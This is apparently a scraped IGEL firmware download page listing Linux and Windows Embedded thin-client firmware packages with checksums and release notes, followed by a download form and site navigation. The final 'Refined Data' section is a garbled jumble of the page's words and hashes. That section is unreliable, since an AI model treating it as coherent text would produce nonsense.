+As IZ devices are not included in the maintenance cycle after EOL of the device, 5.09.100 is the last available firmware update for the IZ2 (D210, Device ID: IZ2-xxx31). The Device ID can be checked in the “About” window, which is available in the IGEL Start Menu. Alternatively you can buy the IZ->UD Upgrade package to convert the device to an Universal Desktop device with software maintenance after EOL.
+The 5.09.100 version includes the Citrix HDX Realtime Media Engine 1.8.0-258, which allows the usage of Lync 2010 and 2013 client (Lync Server 2010 / 2013) together with supported Citrix backends. If you need to run Lync 2013 clients or Skype for Business 2015 client please use the firmware version 5.09.101 available from the IGEL download server.
+lx_5.08.200_public.zip2016/02/23MD5: 1e847a3cc752fd7b7b1eff279106b268SHA-256: 891f8660693ffeca78e17eaa99b6614342c0664be048c137fce0e546916d1b33Firmware update for original IGEL devices IGEL Linux v5.08.200 (.zip) Detailed Descriptionlx_5.08.100_public.zip2015/12/11MD5: 266dca59d46a779dcae3d3e3c6f94743SHA-256: 45ba7a95a3f2cdef6279c47d87015233d3958598ab5f6a1e5d1694704cfe8b2eFirmware update for original IGEL devices IGEL Linux v5.08.100 (.zip) Detailed Descriptionlx_5.08.100_CA-certificates.txt2017/06/07List of CA-certificates included in
+IGEL Linux v5.08.100 (.txt)
+OS10
+lx_10.05.800_public.zip2019/05/08MD5: 76ff8370bddfa44ef60884caea2e776bSHA-256: 0df2428ff48cd3b51c8ed5109a72f6cf366673c036682da8367f377e38f68682Firmware update for original IGEL devices IGEL OS v10.05.800 (.zip) Detailed Descriptionlx_10.05.500_public.zip2018/12/20MD5: 0a5dd56c5a1c57e630f90f71183ec6f7SHA-256: 1313f83df91e7b81ed5554b5c2f297bab18b88f420c9e8ba656fcfed271d9084Firmware update for original IGEL devices IGEL OS v10.05.500 (.zip) Detailed Descriptionlx_10.05.100_public.zip2018/10/25MD5: b9702f240e8d1fcaa694543fd6eb8fb3SHA-256: 458a0cc95fb803f00e88cbe1e2342023ecd3c97cef982b0baaa0e04527a90842Firmware update for original IGEL devices IGEL OS v10.05.100 (.zip) Detailed Descriptionlx_10.04.100_public.zip2018/04/12MD5: 092edd3dba74fec036cd72e8c9cb3e61SHA-256: 0b1e30164747a02bc30fbb7207b09a009594a0365d4234d360b5d428271a9ae3Firmware update for original IGEL devices IGEL OS v10.04.100 (.zip) Detailed DescriptionIMPORTANT NOTICE – SMB USAGE
+In this firmware, SMB protocol version was changed from default v1.0 to v2.0.
+When using an older Windows file server, change to version 1.0 is necessary.
+Please see release notes for detailed information.
+lx_10.03.570_public.zip2018/02/01MD5: bc4cf5c92b378cb6e66b3b808b05b897SHA-256: 726cf89df4922b6b37400cca284e0f65563cb5b5a80d3663a40074d7efb1e715Security Update – Please see Release Notes for detailed informationDetailed Descriptionlx_10.03.500_public.zip2017/12/14MD5: b959db8df2a13fcc5556f7aaeb0a3f36SHA-256: 3114acb906d488a68996a8c2fd86d3848c18839bfc5952af290235c3902bc7cbFirmware update for original IGEL devices IGEL OS v10.03.500 (.zip)Detailed Descriptionlx_10.03.210_public.zip2017/10/20MD5: a300f2243ee46110f773d42add91b2e7SHA-256: 197dc59bdad9a4f5567f952be72de85216f1a11afe26a4f97ebd3dce4c02ac0cFirmware update for original IGEL devices IGEL OS v10.03.210 (.zip) - important Update: Security Fixes for KRACK AttacksDetailed Descriptionlx_10.03.110_public.zip2017/08/30MD5: 442499d96e742d88450faaea1034a53aSHA-256: 90db94523274361a3a9da586b2ab3bbaa307087dfd40482b79331ccc16425aaaFirmware update for original IGEL devices IGEL OS v10.03.110 (.zip) Detailed Descriptionlx_10.03.100_public.zip2017/08/30MD5: 799e955b1cea36f55bdd72e2a3638d35SHA-256: 25eb415edd5d0ae8a9dbea95c78a9af298ccfbc9373882da3bcf6b5e36c59c07Firmware update for original IGEL devices IGEL OS v10.03.100 (.zip) Detailed Descriptionlx_10.03.100_CA-certificates.txt2017/08/30List of CA-certificates included in IGEL OS v10.03.100 (.txt)lx_10.02.210_public.zip2017/07/12MD5: b4287419541de694e980924f60f85bcaSHA-256: 3e11d46bd3c36df9b3563b98cfe236f76251601085e8515df0dee479163cb93aFirmware update for original IGEL devices IGEL OS v10.02.210 (.zip) Detailed Descriptionlx_10.02.120_public.zip2017/04/25MD5: 42ae5014813af1e4438a581640c873c4SHA-256: c726f32c6c2912f724c103b6686b4f037ead218621eeafbc11852a34d7084082Firmware update for original IGEL devices IGEL OS v10.02.120 (.zip) Detailed Descriptionlx_10.02.100_CA-certificates.txt2017/06/07List of CA-certificates included in IGEL OS v10.02.100 (.txt)lx_10.01.310_public.zip2017/02/28MD5: 951ff3d93240729ed1e57b49cc5650afSHA-256: 57d306a3e6775dd3ded612a0eac96867e42dfa186ba7f4fbb37ae5f5df03ab30Firmware update for original IGEL devices IGEL OS v10.01.310 (.zip) Detailed Descriptionlx_10.01.120_public.zip2016/12/19MD5: 3f7d0c5e07db77a105e8184dc7d06a9dSHA-256: 021fb1b4ea5f2ce98e17dff9f4dc82c916e1e1502a7e24139e1027ab79389884Firmware update for original IGEL devices IGEL OS v10.02.120 (.zip) Detailed Descriptionlx_10.01.100_public.zip2016/11/23MD5: 297b9d95dfb47c91c6803de01b1993b8SHA-256: 8369f27dd1f71bbcff0295671eb5d6b8e3666a5e9ab68a2bef8e9ac9476c3768Firmware update for original IGEL devices IGEL OS v10.01.100 (.zip) Detailed Descriptionlx_10.01.100_CA-certificates.txt2017/06/07List of CA certificates included in IGEL OS v10.01.100 (.txt)
+WINDOWS
+W7
+UniversalDesktopWES-3.13.140.zip2019/06/03MD5: 3010ee633005f00ff75a24360f38ef4bSHA-256: 5c8064312c467628f1c37805328f5c385ef83cd4f08a4ff66998d5d61ce576e3Added Microsoft Windows Update for CVE-2019-0708 (KB4499175)Detailed DescriptionUniversalDesktopWES-3.13.110.zip2018/04/13MD5: f6d2142840abb7fe79a08f1ece9141b9SHA-256: 9b0a73f367ecee95b0ae77bc79e704678a4ae97a016902ee49846ce0e2068867Added Microsoft Windows Update for CredSSP (KB4088878)Detailed DescriptionUniversalDesktopWES-3.13.100.zip2018/01/25MD5: 0a30944734916dee7b0cf544dd3a6919SHA-256: 29538873d5817a19493b4537007b9939b45c18a64d97382ddbc0b5d9a4adee6eFirmware update for original IGEL Windows Embedded Standard devices WES 3.13.100 (.zip)Detailed DescriptionUniversalDesktopWES-3.12.100.zip2016/08/04MD5: 581cf7f130b36d2095559ad9c4324f01SHA-256: f7964ee3be038a17b300d2aa396258b85c81051fa2f0c9d060ecde3b8c49bd86Firmware update for original IGEL Windows Embedded Standard devices WES 3.12.100 (.zip)Detailed DescriptionUniversalDesktopWES-3.11.100.zip2016/02/01MD5: 1c48eddbf3b266427b94e2eb26b2c068SHA-256: bfdd161faedcc3b72aac094b012fd68d574e3911a21ec76d7aa1537d1f004f41Firmware update for original IGEL Windows Embedded Standard devices WES 3.11.100 (.zip)Detailed DescriptionUniversalDesktopWES-3.10.120.zip2015/07/20MD5: 75df1e8de4b479c456fc18b33c83d6c8SHA-256: 2e5cb51a82a3e7fcd3aca26c8df8629758b40270c3949c6fc9a99556cd6ff2dcFirmware update for original IGEL Windows Embedded Standard devices WES 3.10.120 (.zip)Detailed DescriptionUniversalDesktopWES-3.10.100.zip2015/06/08MD5: 86cc2e21c06eb30f637a1ba123f9f540SHA-256: fcb36ef3ae6a97e83fb99efcf539c0171c3835b826f41aef6ae58774cc51d9b2Firmware update for original IGEL Windows Embedded Standard devices WES 3.10.100 (.zip)Detailed Description
+W7 Language Packs
+LAP_chinese_simplified_SP1_V12.zip2018/01/25MD5: 4c7ebf3c1618699f8714a5e645744953SHA-256: f4b2d94edf05bb728da510659e4c32eb252df7a4523642c8c1dabd9e4bc92ea6Simplified Chinese language pack for Windows Embedded Standard 7LAP_chinese_traditional_SP1_V12.zip2018/01/25MD5: 3c4cc837803a915bd1c691c09102aa27SHA-256: a7a3f5285bfeb531ac1f3213090951283a97825b7118b180b2298970d0d1bb09Traditional Chinese language pack for Windows Embedded Standard 7LAP_dutch_SP1_V12.zip2018/01/25MD5: 167c5b99f66820df422a2864ea6f4df2SHA-256: 9a81b1e42860475f350b9e2f53f02a0631141d3831e56ffa0a0cd0c7f1a25eafDutch language pack for Windows Embedded Standard 7LAP_english_SP1_V12.zip2018/01/25MD5: 5eac6b9a4aed98e51daae01800bbc7a7SHA-256: 817b921b14f21df1ff3eaa3193eee72c92efc158c3f241b781527ccdc9ee1ceaEnglish language pack for Windows Embedded Standard 7LAP_french_SP1_V12.zip2018/01/25MD5: 0f26382d055fd1d956b978d0b806aaf2SHA-256: 6697f7f92d71148997503cf7a01dc5533e2166beae246c0f09c3a9bd705a5fccFrench language pack for Windows Embedded Standard 7LAP_german_SP1_V12.zip2018/01/25MD5: 1af7fa1c83ac5887f135e2878c912927SHA-256: de110393823c92b9f73ba5914cd8a89d6e3a12eddfe7ba64567a6a665679ff30German language pack for Windows Embedded Standard 7
+W7 Partial Updates
+PU_WES7_Meltdown_Spectre.zip2018/01/12MD5: e139e907a3842658ead71b51b4fbbe2eSHA-256: 6b616c3ec756d429bf7d07950d4ec004a6bdaffb30d65b8041f843b8a8db68f4Security Update – Please see Readme for detailed informationDetailed DescriptionPU_WES7_KB4041678.zip2017/10/23MD5: 792f490cf69b61c0ef0ee1acc40a5b96SHA-256: 2ef44c0ef8e14f8c139b49d61c35d9036c044be8322239aea565b2818b29220bImportant update: Security fixes for KRACK Attacks includedDetailed Description
+W7+
+UniversalDesktopWES7+-3.13.140.zip2019/06/03MD5: 29598a6b3b5f42cfcad9df957294a4a8SHA-256: 0bcfe57a2e85e72f80a4fa35ec335bfe28a72b478d35ffd030939d1ab17c590aAdded Microsoft Windows Update for CVE-2019-0708 (KB4499175)Detailed DescriptionUniversalDesktopWES7+-3.13.110.zip2018/04/13MD5: f0a511a281fc95f60c91d8456793bed3SHA-256: 6b8b9f4dc4f7623482364c66a36be501b8422aff6691d58ac94ac2ec378729aeAdded Microsoft Windows Update for CredSSP (KB4088878)Detailed DescriptionUniversalDesktopWES7+-3.13.100.zip2018/01/25MD5: 91dcb4a0662b0fb86754a3f9500f796dSHA-256: df99548ccbeab216a4f77b5bb5ccb4098f20a7bb4a136c695dff36161d44ac63Firmware update for original IGEL Windows Embedded Standard 7+ devices WES7 3.13.100 (.zip)Detailed DescriptionUniversalDesktopWES7+-3.12.100.zip2016/08/04MD5: 1471e229bf16366d339082cd4fcb6581SHA-256: be1fa8ec0bfe94fc3bd8a85c6164294c3e617fe9701fbcb0ff6edc16de55ccc2 Firmware update for original IGEL Windows Embedded Standard 7+ devices WES7 3.12.100 (.zip)Detailed DescriptionUniversalDesktopWES7+-3.11.100.zip2016/02/01MD5: 4f4765d903339674b3bd195d8ace9e24SHA-256: 8b8c8d0146e570bf77a7e79b9af85a4a553dd3915a9fde65808e7d66c8667d44Firmware update for original IGEL Windows Embedded Standard 7+ devices WES7 3.11.100 (.zip)Detailed DescriptionUniversalDesktopWES7+-3.10.120.zip2015/07/17MD5: 8a96ef2f17382ec4b2bfd8fae26d1615SHA-256: 5934068416caf7788044c242ea7a05b962e91ff15931e3e472541f6a969c1854Firmware update for original IGEL Windows Embedded Standard 7+ devices WES7 3.10.120 (.zip)Detailed DescriptionUniversalDesktopWES7+-3.10.100.zip2015/06/08MD5: 60d1a859b37f97bbd0a02be50eff764cSHA-256: 70b01d1c5ab00548c2425c5acaf5a7195106587ad516089235bd990eabee0127Firmware update for original IGEL Windows Embedded Standard 7+ devices WES7 3.10.100 (.zip)Detailed Description
+W7+ Language Packs
+LAP_chinese_simplified_SP1_V12.zip2018/01/25MD5: 4c7ebf3c1618699f8714a5e645744953SHA-256: f4b2d94edf05bb728da510659e4c32eb252df7a4523642c8c1dabd9e4bc92ea6simplified Chinese language Pack for Windows Embedded Standard 7+LAP_chinese_traditional_SP1_V12.zip2018/01/25MD5: 3c4cc837803a915bd1c691c09102aa27SHA-256: a7a3f5285bfeb531ac1f3213090951283a97825b7118b180b2298970d0d1bb09Traditional Chinese language pack for Windows Embedded Standard 7+LAP_dutch_SP1_V12.zip2018/01/25MD5: 167c5b99f66820df422a2864ea6f4df2SHA-256: 9a81b1e42860475f350b9e2f53f02a0631141d3831e56ffa0a0cd0c7f1a25eafDutch language pack for Windows Embedded Standard 7+LAP_english_SP1_V12.zip2018/01/25MD5: 5eac6b9a4aed98e51daae01800bbc7a7SHA-256: 817b921b14f21df1ff3eaa3193eee72c92efc158c3f241b781527ccdc9ee1ceaEnglish language pack for Windows Embedded Standard 7+LAP_french_SP1_V12.zip2018/01/25MD5: 0f26382d055fd1d956b978d0b806aaf2SHA-256: 6697f7f92d71148997503cf7a01dc5533e2166beae246c0f09c3a9bd705a5fccFrench language pack for Windows Embedded Standard 7+LAP_german_SP1_V12.zip2018/01/25MD5: 1af7fa1c83ac5887f135e2878c912927SHA-256: de110393823c92b9f73ba5914cd8a89d6e3a12eddfe7ba64567a6a665679ff30German language pack for Windows Embedded Standard 7+
+W7+ Partial Updates
+PU_WES7_Meltdown_Spectre.zip2018/01/12MD5: e139e907a3842658ead71b51b4fbbe2eSHA-256: 6b616c3ec756d429bf7d07950d4ec004a6bdaffb30d65b8041f843b8a8db68f4Security Update – Please see Readme for detailed informationDetailed DescriptionPU_WES7_KB4041678.zip2017/10/23MD5: 792f490cf69b61c0ef0ee1acc40a5b96SHA-256: 2ef44c0ef8e14f8c139b49d61c35d9036c044be8322239aea565b2818b29220bImportant update: Security fixes for KRACK AttacksDetailed Description
+W10
+UniversalDesktopW10-4.04.100.zip2019/05/31MD5: 15b27fbff979d9207e707f87349c0459SHA-256: e35e5c6712618e376ca708fd117f63874599e9ce78398c0dc49a5821b125aa18Firmware update for original IGEL Windows 10 Embedded IoT Enterprise devices W10 4.04.100 (.zip)Detailed DescriptionUniversalDesktopW10-4.03.110.zip2019/02/05MD5: fbb3b92bd8c20b150f79953f0d806812SHA-256: 0c42dbd408fe8f85a7eb79bd8056c57f58d3f4d85313ec5f01cb6b41be95ed62Firmware update for original IGEL Windows 10 Embedded IoT Enterprise devices W10 4.03.110 (.zip)Detailed DescriptionUniversalDesktopW10-4.03.100.zip2018/12/10MD5: 0b1daec3d17c07bdbf752d73bb3a9a78SHA-256: d7bfa45f0dfd3960d1e8ea1a2d352b089cdf2e64890adbc5dcba2cd728ebf7e4Firmware update for original IGEL Windows 10 Embedded IoT Enterprise devices W10 4.03.100 (.zip)Detailed DescriptionIMPORTANT NOTICE:
+---------------------
+Please be aware that there is currently an issue with UMS Versions >= 5.09.100 and W10 firmware we strongly recommend not to use Universal Firmware Update with W10!
+Therefore, please use SMB or File protocol to update W10 Firmware or use a third-party HTTP/HTTPS server. Since W10 Version 4.03.100 also use FTP protocol can be used. We are working on a solution for it.
+UniversalDesktopW10-4.02.110.zip2018/06/15MD5: 17302402180a6b5861391b08061d20f5SHA-256: 31101659ca32784105fdf531011462db23b18d9a453771b49b4cb586c316bad9Firmware update for original IGEL Windows 10 Embedded IoT Enterprise devices W10 4.02.110 (.zip)Detailed DescriptionUniversalDesktopW10-4.02.100.zip2018/05/11MD5: 07121c1279ecabd8d63122d24ad9b5acSHA-256: ee1f4c1e753b0d087ea93a310fc4c12f9769ad0106ed70bb5ef59e21ac05cb3dFirmware update for original IGEL Windows 10 Embedded IoT Enterprise devices W10 4.02.100 (.zip)Detailed DescriptionUniversalDesktopW10-4.01.140.zip2018/01/12MD5: 0d6a8afc8f89fd12dba94b3f636bf356SHA-256: 227f14d5fd732553eed00c02e696454a994ccce3d624de218e03672ec0f1878eSecurity Update – Please see Release Notes for detailed informationDetailed DescriptionUniversalDesktopW10-4.01.130.zip2017/10/25MD5: 6d90f380728e1768558e7667e46f8893SHA-256: e98784a3356053afca6c4eeb72490463c99a41118a931a0e490e1075182eac37Important update: Security fixes for KRACK AttacksDetailed DescriptionUniversalDesktopW10-4.01.110.zip2017/05/16MD5: 5066d8c98867f86fc3eb73a16bcaf313SHA-256: a956d1db74cea4074d4e8fdaf3afa9994a2b6c3efe2004462342b9d164002f03Firmware update for original IGEL Windows 10 Embedded IoT Enterprise devices W10 4.01.110 (.zip)Detailed Description
+W10 Partial Updates
+Read and Accept the Disclaimer to downlad
+I ACCEPT
+first name
+last name
+company
+email address
+country
+Select a Country
+Australia
+Austria
+Belgium
+Bermuda
+Bolivia
+Bosnia and Herzegovina
+Brazil
+British Virgin Islands
+Brunei Darussal
+Bulgaria
+Canada
+China
+Colombia
+Croatia
+Cyprus
+Czech Republic
+Denmark
+Estonia
+Ethiopia
+Fiji
+Finland
+France
+Georgia
+Germany
+Gibraltar
+Greece
+Guadeloupe
+Guernsey
+Hong Kong SAR of China
+Hungary
+Iceland
+India
+Indonesia
+Ireland
+Italy
+Japan
+Jamaica
+Jersey
+Kazakhstan
+Kenya
+Latvia
+Liechtenstein
+Lithuania
+Luxembourg
+Malaysia
+Malta
+Marshall Islands
+Martinique
+Mauritius
+Mexico
+Monaco
+Nepal
+Netherlands
+New Caledonia
+New Zealand
+Norway
+Oman
+Philippines
+Poland
+Portugal
+Puerto Rico
+Romania
+Saudi Arabia
+Senegal
+Serbia
+Serbia and Montenegro
+Singapore
+Slovakia
+Slovenia
+South Africa
+South Korea
+Spain
+Sri Lanka
+Sweden
+Switzerland
+Taiwan
+Thailand
+Turkey
+Uganda
+United Arab Emirates
+United Kingdom
+United States
+Vietnam
+I agree to the terms + conditions, all EULA‘s and privacy policy
+Customers
+Support
+Events
+Company
+Resources
+Careers
+Blog
+Contact
+Free Download
+ISO Certifications
+Environmental Performance Report
+Corporate Culture
+Supply Chain Responsibility
+WHY IGEL
+Who Needs It
+Why Revolutionary
+ROI Calculator
+How We Compare
+Our Powerful Partnerships
+PRODUCTS
+Hardware
+Endpoints
+Zero Clients
+Software
+IGEL OS
+Endpoint security and optimization (UMS)
+UMS Add Ons
+IGEL Certified Hardware
+SOLUTIONS
+For Your Application
+For Your Virtualization Project Stage
+Considering Virtualization
+Proof of Concept
+Doing Pilot
+Deploy
+Scaling Up
+For Your Industry
+Education & Research
+Services: Financial, Insurance & Legal
+HealthCare
+Government
+Retail
+Manufacturing & Logistics
+Utilities
+Other
+Connect with us
+IGEL Deutsch
+IGEL is a world leader in endpoint security and optimization software, software-defined endpoints, and thin and zero client solutions. IGEL workspace solutions provide true enterprise management, allowing IT departments to easily manage PCs, notebooks, thin and zero clients under one robust platform.
+TERMS + CONDITIONS
+PRIVACY POLICY
+LEGAL NOTICE
+SITEMAP
+© IGEL 2019. ALL RIGHTS RESERVED
+CookiesThis site uses cookies:
+Find out more.Okay, thanks
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 Ftp firmware update utility
+Refined:  220 ftp firmware update utility
+
+============================https://www.igel.com/software-downloads/igel-universal-desktop-firmware/===============================
+
+ china hungary iceland india indonesia ireland italy japan jamaica jersey kazakhstan kenya latvia liechtenstein lithuania luxembourg malaysia malta marshall islands martinique mauritius mexico monaco nepal netherlands new caledonia new zealand norway oman philippines poland portugal puerto rico romania saudi arabia senegal serbia serbia herzegovina brazil british virgin islands brunei darussal bulgaria canada china colombia croatia cyprus czech republic denmark estonia ethiopia fiji finland france georgia germany gibraltar greece guadeloupe guernsey hong kong sar montenegro singapore slovakia slovenia south africa south korea spain sri lanka sweden switzerland taiwan thailand turkey uganda united arab emirates united kingdom united states vietnam compareour powerful partnerships products igel workspace edition igel osuniversal management suite enterprise management pack enterprise management pack overview hardware endpointsigel certified hardware product support product support overview devices privacy policy customers support events company resources careers blog contact free download iso certifications environmental performance report corporate culture supply chain responsibility distributor partner forms download 3 licensesfree hardware eventscompanyresourcescareerscontactblogcommunityfree hardwaredownload software downloads software powerful partnerships products hardware endpoints zero clients software igel os endpoint security dealpartner resources strategic partners technology partnersigel certified hardwaremanaged service providers accept first name last name company email address country select igel workspace solutions provide true enterprise management conditions privacy policy legal notice sitemap © igel 2019 original igel windows 10 embedded iot enterprise devices w10 4 applications end user computingunified communicationauthenticationusb managementdictationsignatureprintingsecure tunnelingterminal emulation ums add ons igel certified hardware solutions original igel windows embedded standard devices wes 3 country australia austria belgium bermuda bolivia bosnia windows embedded standard 7 w7 partial updates pu_wes7_meltdown_spectre igel linux v5 – samsung edition new igel os 10 original igel devices igel os v10 new igel linux 10 726cf89df4922b6b37400cca284e0f65563cb5b5a80d3663a40074d7efb1e715security update – please see release notes 227f14d5fd732553eed00c02e696454a994ccce3d624de218e03672ec0f1878esecurity update – please see release notes original igel devices igel linux v5 rights reserved cookiesthis site uses cookies igel menumenucompanyresourcescareersblogcommunitycontactenglish deutsch menumenudownloadfree hardwarewhy igel original igel windows embedded standard 7 virtualization project stage considering virtualization proof samsung igel os 10 upgrade license citrix hdx realtime media engine 1 6b616c3ec756d429bf7d07950d4ec004a6bdaffb30d65b8041f843b8a8db68f4security update – please see readme detailed description w10 partial updates read virtualization project stage considering virtualizationproof detailed descriptionimportant notice – smb usage legal healthcare government retail manufacturing detailed description w7 language packs lap_chinese_simplified_sp1_v12 logisticsutilitiesother customerssupportpartners solution providers find krack attacks includeddetailed description w7 krack attacks includeddetailed descriptionsamsung endpoints firmware enables igel lx v5 support acer iz -> ud upgrade package please see release notes us igel deutsch igel igel download server windows embedded standard 7 f4b2d94edf05bb728da510659e4c32eb252df7a4523642c8c1dabd9e4bc92ea6simplified chinese language pack a7a3f5285bfeb531ac1f3213090951283a97825b7118b180b2298970d0d1bb09traditional chinese language pack krack attacksdetailed description w10 universaldesktopw10 rolling igel os 10 windows embedded standard 7lap_german_sp1_v12 windows embedded standard 7lap_french_sp1_v12 windows embedded standard 7lap_english_sp1_v12 windows embedded standard 7lap_dutch_sp1_v12 windows embedded standard 7lap_chinese_traditional_sp1_v12 rolling igel linux 10 business 2015 client please use 100 also use ftp protocol devices wes7 3 rdp – credsspdetailed descriptionlx_5 partial updates pu_wes7_meltdown_spectre igel universal desktop firmware since w10 version 4 igel os v10 de110393823c92b9f73ba5914cd8a89d6e3a12eddfe7ba64567a6a665679ff30german language pack 9a81b1e42860475f350b9e2f53f02a0631141d3831e56ffa0a0cd0c7f1a25eafdutch language pack 817b921b14f21df1ff3eaa3193eee72c92efc158c3f241b781527ccdc9ee1ceaenglish language pack 6697f7f92d71148997503cf7a01dc5533e2166beae246c0f09c3a9bd705a5fccfrench language pack igel os 10 detailed descriptionuniversaldesktopwes7 +- 3 solution providerpartner program overviewregister solution provider near youbecome existing custom partitions based 9b0a73f367ecee95b0ae77bc79e704678a4ae97a016902ee49846ce0e2068867added microsoft windows update 6b8b9f4dc4f7623482364c66a36be501b8422aff6691d58ac94ac2ec378729aeadded microsoft windows update 5c8064312c467628f1c37805328f5c385ef83cd4f08a4ff66998d5d61ce576e3added microsoft windows update 0bcfe57a2e85e72f80a4fa35ec335bfe28a72b478d35ffd030939d1ab17c590aadded microsoft windows update systems integrators distributors find last available firmware update older windows file server run lync 2013 clients igel linux v5 ums versions >= 5 igel lx endpoints igel lx 10 based samsung endpoint zero client solutions detailed descriptionimportant notice use universal firmware update language packs lap_chinese_simplified_sp1_v12 detailed description w7 igel start menu windows w7 universaldesktopwes iz devices detailed descriptionsamsung endpoints zero clients universaldesktopwes7 +- 3 please use smb contact citrix hdx rtme igel endpoints krack attacksdetailed descriptionuniversaldesktopw10 krack attacksdetailed descriptionlx_10 smb protocol version endpoint security update w10 firmware supported citrix backends lx v5 lx_5 detailed informationdetailed descriptionpu_wes7_kb4041678 detailed descriptionimportant information universal desktop device pilot deploy scaling one robust platform full feature set easily manage pcs 800 (. zip 500 (. zip 410 (. zip 400 (. zip 400 (. txt 310 (. zip 290 (. zip 240 (. zip 220 (. zip 210 (. zip 200 (. zip 100 version includes 100 (. zip 100 (. txt detailed informationdetailed descriptionuniversaldesktopw10 detailed informationdetailed descriptionlx_10 firmware version 5 software maintenance be1fa8ec0bfe94fc3bd8a85c6164294c3e617fe9701fbcb0ff6edc16de55ccc2 firmware update xxx 40 ). revolutionary roi calculator igel directly linux v5 optimization software needs itwhy revolutionary lync server 2010 120 (. zip 110 (. zip w10 firmware version 1 software toshiba solutions security fixes security fix defined endpoints igel file protocol detailed descriptionlx_5 ca certificates included detailed descriptionuniversaldesktopw10 detailed descriptionlx_10 please test please get --------------------- please 2013 client onyx healthcare accept detailed information detailed descriptionwith detailed descriptionuniversaldesktopwes 3 lync 2010 iz users https server conditions 4 2019 important update fcb36ef3ae6a97e83fb99efcf539c0171c3835b826f41aef6ae58774cc51d9b2firmware update f7964ee3be038a17b300d2aa396258b85c81051fa2f0c9d060ecde3b8c49bd86firmware update f72805c28d18ac89067c286e1ed78ceba99c6df49c024dad55ff631ad2e6f424firmware update ee1f4c1e753b0d087ea93a310fc4c12f9769ad0106ed70bb5ef59e21ac05cb3dfirmware update ed141f06cccf7f948a3fb743fc9a97de8a1974be4f6bb31148ce8d84825f8795firmware update e98784a3356053afca6c4eeb72490463c99a41118a931a0e490e1075182eac37important update e35e5c6712618e376ca708fd117f63874599e9ce78398c0dc49a5821b125aa18firmware update df99548ccbeab216a4f77b5bb5ccb4098f20a7bb4a136c695dff36161d44ac63firmware update d7bfa45f0dfd3960d1e8ea1a2d352b089cdf2e64890adbc5dcba2cd728ebf7e4firmware update c726f32c6c2912f724c103b6686b4f037ead218621eeafbc11852a34d7084082firmware update c4ea664932108a7d254a194457a2add0f30adc8a4aaefdaed74b74aa9beb16adfirmware update bfdd161faedcc3b72aac094b012fd68d574e3911a21ec76d7aa1537d1f004f41firmware update a956d1db74cea4074d4e8fdaf3afa9994a2b6c3efe2004462342b9d164002f03firmware update 90db94523274361a3a9da586b2ab3bbaa307087dfd40482b79331ccc16425aaafirmware update 8b8c8d0146e570bf77a7e79b9af85a4a553dd3915a9fde65808e7d66c8667d44firmware update 891f8660693ffeca78e17eaa99b6614342c0664be048c137fce0e546916d1b33firmware update 8369f27dd1f71bbcff0295671eb5d6b8e3666a5e9ab68a2bef8e9ac9476c3768firmware update 80e18605ad76ef1f9d2643c126e2e646419f9dc64bbdbe650a9bf7dedf66d0d5firmware update 72b3f5ab9a7a4e3989e4e138ebb3403aacb63d51556e575e3463cc453b26e016firmware update 70b01d1c5ab00548c2425c5acaf5a7195106587ad516089235bd990eabee0127firmware update 5934068416caf7788044c242ea7a05b962e91ff15931e3e472541f6a969c1854firmware update 57d306a3e6775dd3ded612a0eac96867e42dfa186ba7f4fbb37ae5f5df03ab30firmware update 4c0bd2fb034f68c45cb906c98929f2e4680a92a3c0a5dc20fa97dab06ea5b54cfirmware update 48399ef8644ec16673bb14c938023214ee2ecdeac2ca4ee5807f3e3b05ad4b94firmware update 45ba7a95a3f2cdef6279c47d87015233d3958598ab5f6a1e5d1694704cfe8b2efirmware update 458a0cc95fb803f00e88cbe1e2342023ecd3c97cef982b0baaa0e04527a90842firmware update 3e11d46bd3c36df9b3563b98cfe236f76251601085e8515df0dee479163cb93afirmware update 3d638fcce2b02daa7e43c616a84b1e8f6e6a2dce89855474ce6772b0595d45d2firmware update 35900f9a9495e061068eba210a1a2b7fd498d1c158c83ca6eb994ac470640020firmware update 3114acb906d488a68996a8c2fd86d3848c18839bfc5952af290235c3902bc7cbfirmware update 31101659ca32784105fdf531011462db23b18d9a453771b49b4cb586c316bad9firmware update 2ef44c0ef8e14f8c139b49d61c35d9036c044be8322239aea565b2818b29220bimportant update 2e5cb51a82a3e7fcd3aca26c8df8629758b40270c3949c6fc9a99556cd6ff2dcfirmware update 2e077b6760d57c3f9b3e080ad024ffbad0900c93f0d3c92e955e2707406cf9f6firmware update 29538873d5817a19493b4537007b9939b45c18a64d97382ddbc0b5d9a4adee6efirmware update 25eb415edd5d0ae8a9dbea95c78a9af298ccfbc9373882da3bcf6b5e36c59c07firmware update 197dc59bdad9a4f5567f952be72de85216f1a11afe26a4f97ebd3dce4c02ac0cfirmware update 1313f83df91e7b81ed5554b5c2f297bab18b88f420c9e8ba656fcfed271d9084firmware update 0df2428ff48cd3b51c8ed5109a72f6cf366673c036682da8367f377e38f68682firmware update 0d016dfbee822ae81d0113a04d916666fdd84da9225ba1f902bfbef75750eb8cfirmware update 0c42dbd408fe8f85a7eb79bd8056c57f58d3f4d85313ec5f01cb6b41be95ed62firmware update 0b1e30164747a02bc30fbb7207b09a009594a0365d4234d360b5d428271a9ae3firmware update 021fb1b4ea5f2ce98e17dff9f4dc82c916e1e1502a7e24139e1027ab79389884firmware update xxx31 ). roi calculatorhow w10 101 available w7 10 ” window world leader upgrade ums strongly recommend sales representative research services required functions party http maintenance cycle longer function logistics utilities industry educationservices industry education eula ‘ entire environment device id default v1 conceptdoing pilotdeployscaling certificates included advantech advantech additional charge please use usage solution os10 lx_10 iz2 users find firmware universaldesktopw10 business also 100 5 lync available 2013 needs lx_5 information included device certificates ca 120 110 optimization lx_10 iz2 “ ——————— zip2019 zip2018 zip2017 zip2016 zip2015 xxx50 wyse working v2 using used upgraded txt2017 txt2016 together third thin therefore thanks terms stone skype secunet possible perform okay notebooks needed need necessary migrate m340c lg lenovo legalhealthcaregovernmentretailmanufacturing lap_german_sp1_v12 lap_french_sp1_v12 lap_english_sp1_v12 lap_dutch_sp1_v12 lap_chinese_traditional_sp1_v12 kb4499175 kb4088878 iz3 issue intel insurance hp fujitsu financial fbb3b92bd8c20b150f79953f0d806812sha f6d2142840abb7fe79a08f1ece9141b9sha f0a511a281fc95f60c91d8456793bed3sha eol e139e907a3842658ead71b51b4fbbe2esha downlad downgrade dlog disclaimer departments dell d220 d210 cve currently credssp convert connect concept compare checked changed change buy bffb78d85c03287c9c1063b84965414asha bf098a9c2a574afb9812bd42cf2e6fdcsha bc4cf5c92b378cb6e66b3b808b05b897sha b9702f240e8d1fcaa694543fd6eb8fb3sha b959db8df2a13fcc5556f7aaeb0a3f36sha 